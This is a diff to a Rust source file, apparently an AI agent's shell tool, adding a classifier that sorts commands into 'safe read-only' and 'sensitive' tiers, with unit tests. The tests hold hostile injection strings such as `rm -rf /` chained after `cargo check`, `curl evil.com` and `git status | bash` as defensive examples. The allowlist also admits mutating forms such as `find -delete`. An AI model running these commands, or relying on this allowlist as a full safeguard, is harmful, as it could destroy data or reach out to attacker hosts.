@@ -21,6 +21,86 @@ pub struct Outcome {
 const MAX_OUTPUT: usize = 64 * 1024;
 const RUN_TIMEOUT: Duration = Duration::from_secs(120);
 
+/// Execution safety tier for commands run through the shell tool.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum CommandTier {
+    /// Safe read-only inspection, query, or build/test verification commands.
+    SafeReadOnly,
+    /// Commands that mutate files, invoke network, or change system state.
+    SensitiveOrExternal,
+}
+
+/// Returns true if the command is a recognized safe read-only or inspection command
+/// without command chaining, redirection, or command substitution.
+pub fn is_command_safe_read_only(cmd: &str) -> bool {
+    matches!(classify_command(cmd), CommandTier::SafeReadOnly)
+}
+
+/// Classifies a shell command into safety tiers for granular execution approval.
+pub fn classify_command(cmd: &str) -> CommandTier {
+    let trimmed = cmd.trim();
+    if trimmed.is_empty() {
+        return CommandTier::SensitiveOrExternal;
+    }
+
+    // Guard against shell injection, command chaining, and file output redirection.
+    // Metacharacters: ;, &&, ||, |, >, >>, <, $(, `, \n, \r
+    let has_chaining_or_redirect = trimmed.chars().enumerate().any(|(i, c)| match c {
+        ';' | '\n' | '\r' | '`' | '>' | '<' => true,
+        '&' => trimmed.as_bytes().get(i + 1) == Some(&b'&'),
+        '|' => true,
+        '$' => trimmed.as_bytes().get(i + 1) == Some(&b'('),
+        _ => false,
+    });
+
+    if has_chaining_or_redirect {
+        return CommandTier::SensitiveOrExternal;
+    }
+
+    // Allowed base command prefixes for read-only / build verification
+    const SAFE_PREFIXES: &[&str] = &[
+        "cargo check",
+        "cargo test",
+        "cargo clippy",
+        "cargo metadata",
+        "cargo --version",
+        "cargo version",
+        "git status",
+        "git diff",
+        "git log",
+        "git show",
+        "git branch",
+        "git rev-parse",
+        "git describe",
+        "git config --get",
+        "pwd",
+        "ls",
+        "cat",
+        "head",
+        "tail",
+        "wc",
+        "grep",
+        "rg",
+        "find",
+        "file",
+        "which",
+        "echo",
+    ];
+
+    for prefix in SAFE_PREFIXES {
+        if trimmed == *prefix {
+            return CommandTier::SafeReadOnly;
+        }
+        if let Some(rest) = trimmed.strip_prefix(prefix) {
+            if rest.starts_with(' ') || rest.starts_with('\t') {
+                return CommandTier::SafeReadOnly;
+            }
+        }
+    }
+
+    CommandTier::SensitiveOrExternal
+}
+
 /// The tool list as the model sees it (name, description, JSON Schema).
 pub fn specs() -> Vec<(&'static str, &'static str, Value)> {
     let path = json!({"type": "string", "description": "Path relative to the workspace root."});
@@ -270,5 +350,30 @@ mod tests {
         let r = call(&ws, "run", &json!({"command": "cat src/a.txt; exit 3"})).await;
         assert!(r.is_error && r.output.contains("exit: 3") && r.output.contains("hi\nthere\n"));
         assert!(call(&ws, "nope", &json!({})).await.is_error);
+    }
+
+    #[test]
+    fn command_safety_classification_distinguishes_safe_read_only_and_injections() {
+        assert_eq!(classify_command("cargo check"), CommandTier::SafeReadOnly);
+        assert_eq!(classify_command("cargo test -p holon-agentd"), CommandTier::SafeReadOnly);
+        assert_eq!(classify_command("git status"), CommandTier::SafeReadOnly);
+        assert_eq!(classify_command("git diff HEAD~1"), CommandTier::SafeReadOnly);
+        assert_eq!(classify_command("ls -la src/"), CommandTier::SafeReadOnly);
+        assert_eq!(classify_command("cat Cargo.toml"), CommandTier::SafeReadOnly);
+        assert_eq!(classify_command("grep -rn 'todo' src/"), CommandTier::SafeReadOnly);
+
+        // Injections and dangerous metacharacters
+        assert_eq!(classify_command("cargo check; rm -rf /"), CommandTier::SensitiveOrExternal);
+        assert_eq!(
+            classify_command("git status && curl evil.com"),
+            CommandTier::SensitiveOrExternal
+        );
+        assert_eq!(classify_command("cat Cargo.toml > evil.txt"), CommandTier::SensitiveOrExternal);
+        assert_eq!(classify_command("echo `whoami`"), CommandTier::SensitiveOrExternal);
+        assert_eq!(classify_command("echo $(id)"), CommandTier::SensitiveOrExternal);
+        assert_eq!(classify_command("git status | bash"), CommandTier::SensitiveOrExternal);
+        assert_eq!(classify_command("rm -rf target/"), CommandTier::SensitiveOrExternal);
+        assert_eq!(classify_command("git push origin main"), CommandTier::SensitiveOrExternal);
+        assert_eq!(classify_command(""), CommandTier::SensitiveOrExternal);
     }
 }
